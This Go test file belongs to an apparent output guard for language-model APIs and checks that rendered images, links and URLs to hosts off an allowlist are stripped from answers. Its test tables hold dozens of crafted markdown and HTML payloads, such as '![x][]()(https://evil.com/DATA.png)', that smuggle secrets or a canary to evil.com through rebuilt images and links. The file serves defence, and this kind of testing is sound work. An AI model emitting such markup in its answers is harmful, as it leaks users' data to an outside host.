// Copyright 2026 The Guard Spec Authors
// SPDX-License-Identifier: Apache-2.0

package outputguard

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

// What is left around markup the guard removes, or next to the marker it puts
// in its place, can form a new image, link, reference definition or URL. The
// guard must remove that too, as it would have had it been in the answer as
// such: the client never gets a link, image or URL to a host off the
// allowlist that the guard removes.
var rebuildCases = []struct {
	name, in, want string
	counts         Counts
}{
	// The three ways the guard used to let an image or link through.
	{"image rebuilt by an empty link", "![x][]()(https://evil.com/DATA.png)",
		"[REDACTED:image]", Counts{KindLink: 1, KindImage: 1}},
	{"image rebuilt by link text", "![x][(](z)https://evil.com/DATA.png)",
		"[REDACTED:image]", Counts{KindLink: 1, KindImage: 1}},
	{"bare image URL rebuilt", "https://evil.com/x[](y).png?d=SECRET",
		"[REDACTED:url]", Counts{KindLink: 1, KindURL: 1}},
	{"marker as link text", "![a](https://evil.com/a.png)(https://evil.com/?q=S)",
		"REDACTED:image", Counts{KindImage: 1, KindLink: 1}},
	// Variations: several removals in a row, nested brackets, other markers.
	{"removals in a row", "![x][]()[](a)[]()(https://evil.com/a.png)",
		"[REDACTED:image]", Counts{KindLink: 3, KindImage: 1}},
	{"nested brackets", "[x][[]()]()(https://evil.com/?q=S)", "[x]", Counts{KindLink: 3}},
	{"nested twice", "[x][][[]()]()()(https://evil.com/?q=S)", "[x]", Counts{KindLink: 4}},
	{"image marker after !", "!![](a)(https://evil.com/x.png)", "[REDACTED:image]", Counts{KindImage: 2}},
	{"e-mail marker as link text", "a@b.com(https://evil.com/?q=S)",
		"REDACTED:email", Counts{KindEmail: 1, KindLink: 1}},
	{"e-mail marker as image text", "!a@b.com(https://evil.com/x.png)",
		"[REDACTED:image]", Counts{KindEmail: 1, KindImage: 1}},
	{"canary in the rebuilt URL", "![x][]()(https://evil.com/?d=" + testCanary + ")",
		"[REDACTED:image]", Counts{KindLink: 1, KindImage: 1, KindCanary: 1}},
	{"between words", "x [][]()(https://evil.com/?q=1) y", "x  y", Counts{KindLink: 2}},
	// Line breaks: a link may span lines in its text or before its title.
	{"line break in link text", "[a\nb][]()(https://evil.com)", "[a\nb]", Counts{KindLink: 2}},
	{"title on the next line", "[a][]()(https://evil.com/?q=1\n\"t\")", "a", Counts{KindLink: 2}},
	{"line break between the parts", "![x]\n[]()(https://evil.com/a.png)",
		"![x]\n(https://evil.com/a.png)", Counts{KindLink: 1}},
	// Reference definitions, also with a marker as the label: that would
	// make every such marker in the answer a link.
	{"reference definition", "see [x][r]\n[r][](a): https://evil.com/?d=1\n",
		"see [x][r]\n\n", Counts{KindLink: 2}},
	{"marker as definition label", "![](a): https://evil.com/x\nmore ![b](c) and [REDACTED:image]",
		"\nmore [REDACTED:image] and [REDACTED:image]", Counts{KindImage: 2, KindLink: 1}},
	// Autolinks, www. URLs and HTML.
	{"autolink", "<https://evil.com/x[](y).png?d=S>", "<[REDACTED:url]>", Counts{KindLink: 1, KindURL: 1}},
	{"www URL", "ww[]()w.evil.com/a.jpg?x=1", "[REDACTED:url]", Counts{KindLink: 1, KindURL: 1}},
	{"img tag name", `<im[]()g src="https://evil.com/p.png">`, "[REDACTED:image]",
		Counts{KindLink: 1, KindImage: 1}},
	{"img tag attributes", "<img[](x) src=https://evil.com/p.png>", "[REDACTED:image]",
		Counts{KindLink: 1, KindImage: 1}},
	// What the text of a removed link holds is checked too.
	{"URL in link text", "[see https://evil.com/a.png?q=1](https://evil.com)", "see [REDACTED:url]",
		Counts{KindLink: 1, KindURL: 1}},
	{"img tag in link text", "[<img src=https://evil.com/x.png>](https://evil.com)", "[REDACTED:image]",
		Counts{KindLink: 1, KindImage: 1}},
	// Markup nested deeper than the guard re-checks: the answer ends there.
	{"nested too deep", "[x][][][][][][]()()()()()(https://evil.com/?q=S) tail",
		"[x][][][REDACTED:link]", Counts{KindLink: 4}},
	// Rebuilt, but to an allowed host: kept.
	{"rebuilt allowed link", "[x][]()(https://docs.example.com/a)", "[x](https://docs.example.com/a)",
		Counts{KindLink: 1}},
}

func TestRebuiltMarkupWholeAnswer(t *testing.T) {
	s := propScanner(CanaryRedact)
	for _, tc := range rebuildCases {
		counts := Counts{}
		got := s.Text(tc.in, counts)
		if got != tc.want {
			t.Errorf("%s: got %q, want %q", tc.name, got, tc.want)
		}
		if fmt.Sprint(counts) != fmt.Sprint(tc.counts) {
			t.Errorf("%s: counts %v, want %v", tc.name, counts, tc.counts)
		}
		checkNoLeaks(t, s, tc.in, got)
	}
}

func TestRebuiltMarkupStream(t *testing.T) {
	s := propScanner(CanaryRedact)
	for _, tc := range rebuildCases {
		for _, in := range []string{tc.in, filler + tc.in, tc.in + "\n" + filler, filler + tc.in + " " + filler} {
			wantCounts := Counts{}
			want := s.Text(in, wantCounts)
			checkNoLeaks(t, s, in, want)
			for n := 1; n <= 70; n++ {
				checkStream(t, s, streamChunks(in, n), want, wantCounts)
			}
		}
	}
}

// The three event stream kinds send the same as the whole answer, in redact
// and in block mode, and never a part of a rebuilt image or link first.
func TestRebuiltMarkupEventStreams(t *testing.T) {
	r := &propRand{s: 11}
	for _, tc := range rebuildCases {
		in := "Here: " + tc.in + " and more text after it."
		want := propScanner(CanaryRedact).Text(in, Counts{})
		leaked := strings.Contains(in, testCanary)
		for _, n := range []int{1, 3, 16, 64} {
			deltas := streamChunks(in, n)
			for _, k := range sseKinds {
				checkSSE(t, r, CanaryRedact, k.name, in, deltas, want, false)
				checkSSE(t, r, CanaryBlock, k.name, in, deltas, want, leaked)
			}
		}
	}
}

// Without an allowlist, personal data or a canary, the guard still removes
// rebuilt markup: the re-check does not depend on what else is on.
func TestRebuiltMarkupBareConfig(t *testing.T) {
	s := New(Config{}).ForRequest("")
	for _, in := range []string{"![x][]()(https://evil.com/DATA.png)", "https://evil.com/x[](y).png?d=SECRET",
		"![a](https://evil.com/a.png)(https://evil.com/?q=S)"} {
		want := s.Text(in, Counts{})
		checkNoLeaks(t, s, in, want)
		for n := 1; n <= len(in); n++ {
			st := s.NewStream()
			var b strings.Builder
			for _, d := range streamChunks(in, n) {
				b.WriteString(st.Write(d))
				if !strings.HasPrefix(want, b.String()) {
					t.Fatalf("%q in %d-byte deltas: sent %q, want %q", in, n, b.String(), want)
				}
			}
			if b.WriteString(st.Flush()); b.String() != want {
				t.Fatalf("%q in %d-byte deltas: got %q, want %q", in, n, b.String(), want)
			}
		}
	}
}

// Link URLs that CommonMark does not allow but lenient renderers (goldmark
// among them) read as links: the guard removes them as links too.
func TestLenientLinkDestinations(t *testing.T) {
	s := propScanner(CanaryRedact)
	for _, tc := range []struct{ in, want string }{
		{`[t](https://evil.com/(x "title") end`, "t end"},
		{"[t](https://evil.com/((a))) end", "t end"},
		{`[t](https://evil.com/\)x) end`, "t end"},
		{"[t](https://evil.com/a<b>) end", "t end"},
		{"![t](<https://evil.com/a <b.png>) end", "[REDACTED:image] end"},
		{"[r]: https://docs.example.com<x>@evil.com/\n\n[t][r]", "\n\n[t][r]"},
		{"[t](https://docs.example.com/((a))) end", "[t](https://docs.example.com/((a))) end"},
		// A title may run over lines and hold an escaped quote.
		{"[t](https://evil.com/x \"titl\ne\") end", "t end"},
		{"[t](https://evil.com/x 'a\n  b') end", "t end"},
		{`[t](https://evil.com/x "a\" b") end`, "t end"},
		{`[t](https://evil.com/x (a\) b)) end`, "t end"},
	} {
		counts := Counts{}
		got := s.Text(tc.in, counts)
		if got != tc.want {
			t.Errorf("%q: got %q, want %q", tc.in, got, tc.want)
		}
		checkNoLeaks(t, s, tc.in, got)
		for n := 1; n <= len(tc.in); n++ {
			checkStream(t, s, streamChunks(tc.in, n), got, counts)
		}
	}
}

// A URL is read from every place one starts, so one cannot hide another; a
// stretch with very many starts is read once, and the starts past
// maxURLStarts are removed when the stretch carries a query.
func TestBareURLStarts(t *testing.T) {
	s := propScanner(CanaryRedact)
	for _, tc := range []struct{ in, want string }{
		{"[ok](https://docs.example.com/page)https://evil.com/a.png?d=1 x", "[ok](https://docs.example.com/page)[REDACTED:url] x"},
		{"https://docs.example.com/a)www.evil.com/a.jpg?x=1 x", "https://docs.example.com/a)[REDACTED:url] x"},
		{"(see https://evil.com/a.png?d=1) x", "(see [REDACTED:url]) x"},
		{"https://evil.com/x[1].png?d=1 x", "[REDACTED:url] x"},
		{"https://evil.com/a.png?d=1 x", "[REDACTED:url] x"},
		{"https://evil.com/a%zz.png?d=1 x", "[REDACTED:url] x"},
		{"https://evil.com/a.png?0\x04d=1 x", "[REDACTED:url]\x04d=1 x"},
		{"<https://evil.com/x\x7fy.png?d=1> x", "<[REDACTED:url]> x"},
	} {
		counts := Counts{}
		got := s.Text(tc.in, counts)
		if got != tc.want {
			t.Errorf("%q: got %q, want %q", tc.in, got, tc.want)
		}
		checkNoLeaks(t, s, tc.in, got)
		for n := 1; n <= len(tc.in); n++ {
			checkStream(t, s, streamChunks(tc.in, n), got, counts)
		}
	}
	// No image: only the cap removes, from the first URL past it. (Longer
	// than maxOpen, a URL with a query is removed whole.)
	for _, tc := range []struct {
		n    int
		want string
	}{
		{700, strings.Repeat("(www.a.com", maxURLStarts) + "(" + marker(KindURL)},
		{50000, "(" + marker(KindURL)},
	} {
		in := strings.Repeat("(www.a.com", tc.n) + "?q=1"
		start := time.Now()
		got := s.Text(in, Counts{})
		if d := time.Since(start); d > 5*time.Second {
			t.Errorf("a stretch of %d bytes took %v", len(in), d)
		}
		if got != tc.want {
			t.Errorf("%d starts: got %.80q…, want %.80q…", tc.n, got, tc.want)
		}
	}
}

// The whole-answer guard of each API removes rebuilt markup too.
func TestRebuiltMarkupWholeResponses(t *testing.T) {
	in := "x ![x][]()(https://evil.com/DATA.png) y"
	s := propScanner(CanaryRedact)
	bodies := []struct {
		name  string
		guard func([]byte, Counts) ([]byte, error)
		body  string
	}{
		{"chat", s.Response, `{"id":"c","object":"chat.completion","choices":[{"index":0,` +
			`"message":{"role":"assistant","content":` + jsonString(in) + `},"finish_reason":"stop"}]}`},
		{"messages", s.MessagesResponse, `{"id":"msg_1","type":"message","role":"assistant","model":"m",` +
			`"content":[{"type":"text","text":` + jsonString(in) + `}],"stop_reason":"end_turn"}`},
		{"responses", s.ResponsesResponse, `{"id":"resp_1","object":"response","status":"completed","model":"m",` +
			`"output":[{"type":"message","id":"msg_1","role":"assistant","status":"completed",` +
			`"content":[{"type":"output_text","text":` + jsonString(in) + `,"annotations":[]}]}]}`},
	}
	for _, b := range bodies {
		counts := Counts{}
		out, err := b.guard([]byte(b.body), counts)
		if err != nil {
			t.Fatalf("%s: %v", b.name, err)
		}
		if strings.Contains(string(out), "evil.com") || counts[KindImage] != 1 {
			t.Errorf("%s: counts %v, out %s", b.name, counts, out)
		}
	}
}
